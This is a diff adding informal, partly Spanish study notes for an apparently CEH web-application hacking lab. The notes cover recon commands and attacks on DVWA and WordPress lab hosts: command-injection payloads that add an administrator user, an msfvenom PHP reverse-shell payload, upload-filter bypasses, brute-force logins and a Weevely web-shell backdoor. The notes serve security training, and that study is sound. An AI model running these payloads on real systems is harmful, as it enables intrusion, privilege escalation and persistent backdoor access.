@@ -1,0 +1,90 @@
+14-Hacking Web Applications
+
+
+    Footprint the web infrastructure
+            Footprinting the web infrastructure allows attackers to engage in the following tasks:
+            Server Discovery: 
+            Service Discovery: 
+            Server Identification: 
+            Hidden Content Discovery: 
+        Perform web application reconnaissance
+            Perform a Whois lookup to gather information about the IP address of the web server and the complete information about the domain such as its registration details, name servers, IP address, and location.
+                Use tools such as Netcraft (https://www.netcraft.com), SmartWhois (https://www.tamos.com), WHOIS Lookup (http://whois.domaintools.com), and Batch IP Converter (http://www.sabsoft.com) to perform the Whois lookup.
+            Perform DNS Interrogation to gather information about the DNS servers, DNS records, and types of servers used by the target organization. DNS zone data include DNS domain names, computer names, IP addresses, domain mail servers, service records, etc.
+                Use tools such as Professional Toolset (https://tools.dnsstuff.com), DNSRecon (https://github.com), and DNS Records (https://network-tools.com), Domain Dossier (https://centralops.net) to perform DNS interrogation.
+            PORT scanning
+                nmap -T4 -A -v [Target Web Application]
+                -T4: specifies setting time template (0-5), -A: specifies aggressive scan, and -v: enables the verbose output
+
+        Perform web application reconnaissance using WhatWeb
+             whatweb -v [Target Web Application]
+             for Report:whatweb --log-verbose=MovieScope_Report www.moviescope.com 
+
+        Perform web spidering using OWASP ZAP
+            Automated Scan wizard appears; enter the target website under the URL to attack field (here, www.moviescope.com
+            Usado para descubrir cosas
+        Detect load balancers using various tools
+            lbd yahoo.com
+        Identify web server directories
+            Attackers use the Nmap NSE script http-enum to enumerate the applications, directories, and files of the web servers that are exposed on the Internet
+                nmap -sV --script=http-enum
+            In real-time, attackers use Gobuster to scan the target website for web server directories and perform fast-paced enumeration of the hidden files and directories of the target web application.
+                gobuster dir -u [Target Website] -w /home/attacker/Desktop/common.txt,
+
+        Perform web application vulnerability scanning using Vega
+            Automatic scanner for vulns
+            You can also use other web application vulnerability scanning tools such as WPScan Vulnerability Database (https://wpscan.com), Arachni (https://www.arachni-scanner.com), appspider (https://www.rapid7.com), or Uniscan (https://sourceforge.net) to discover vulnerabilities in the target website.
+
+        Identify clickjacking vulnerability using iframe
+            Clickjacking, also known as a “UI redress attack,” occurs when an attacker uses multiple transparent or opaque layers to trick a user into clicking on a button or link on another page when they intend to click on the top-level page. 
+            If you can see the text “Website is vulnerable to clickjacking!” at the top of the page, and your target web page is also successfully loaded into the frame, then your site is vulnerable and has no type of protection against Clickjacking attacks.
+
+    Perform web application attacks
+        Perform a brute-force attack using Burp Suite
+            a Burp Suite proxy by first configuring the proxy settings of the browser. 
+
+            Cluster bomb uses multiple payload sets. There is a different payload set for each defined position (up to a maximum of 20). The attack iterates through each payload set in turn so that all permutations of payload combinations are tested. For example, if there are two payload positions, the attack will place the first payload from payload set 2 into position 2 and iterate through all payloads in payload set 1 in position 1; it will then place the second payload from payload set 2 into position 2 and iterate through all the payloads in payload set 1 in position 1.
+
+        Perform parameter tampering using Burp Suite
+            Using burp for IDORS
+        Exploit parameter tampering and XSS vulnerabilities in web applications
+            This process of changing the ID value and getting the result is known as parameter tampering
+            Store Xsss
+
+        Perform cross-site request forgery (CSRF) attack
+            CSRF, also known as a one-click attack, occurs when a hacker instructs a user’s web browser to send a request to the vulnerable website through a malicious web page. 
+            wpscan --api-token [API Token from Step#25] --url http://10.10.10.16:8080/CEH --plugins-detection aggressive --enumerate vp 
+            Using a script for CSRF, se hace que se envie un form X para cambiar unos valores del plugin
+
+        Enumerate and hack a web application using WPScan and Metasploit
+            wpscan --api-token [API Token] --url http://10.10.10.16:8080/CEH --enumerate u and press Enter.
+            Now, using metasploit    
+            use auxiliary/scanner/http/wordpress_login_enum                    
+                PASS_FILE: Sets the password.txt file, using which; you will perform the dictionary attack
+                RHOST: Sets the target machine (here, the Windows Server 2016 IP address)
+                RPORT: Sets the target machine port (here, the Windows Server 2016 port)
+                TARGETURI: Sets the base path to the WordPress website (here, http://[IP Address of Windows Server 2016]:8080/CEH]
+                USERNAME: Sets the username that was obtained in Step 8. (here, admin)
+            This use a brute force
+
+        Exploit a remote command execution vulnerability to compromise a target web server
+            | tasklist
+            Using this operator to do RCE in a ping bar
+            Adding a user
+            | net user Test /Add
+            | net localgroup Administrators Test /Add
+        Exploit a file upload vulnerability at different security levels
+            Creating a exploit RAW for a reverse tcp php
+            msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP Address of Host Machine] LPORT=4444 -f raw
+            Low level: upload.php
+            Medium level:up.php.jpg, changin to .php  en burp
+            High: h.jpg and changing to php atravez RCE 
+                |copy C:\wamp64\www\DVWA\hackable\uploads\high.jpeg C:\wamp64\www\DVWA\hackable\uploads\shell.php
+        Gain backdoor access via a web shell using Weevely
+            Weevely is used to develop a backdoor shell and upload it to a target server in order to gain remote shell access. This tool also helps in performing administrative tasks, maintaining persistence, and spreading backdoors across the target network.
+            Weevely encodes the payload with a key phrase so that no one else can use it to access the target system.
+            Switch back to the Terminal window, type weevely http://10.10.10.16:8080/dvwa/hackable/uploads/shell.php [Password] 
+            Muy util para crear una backdoor con contraseña
+
+
+
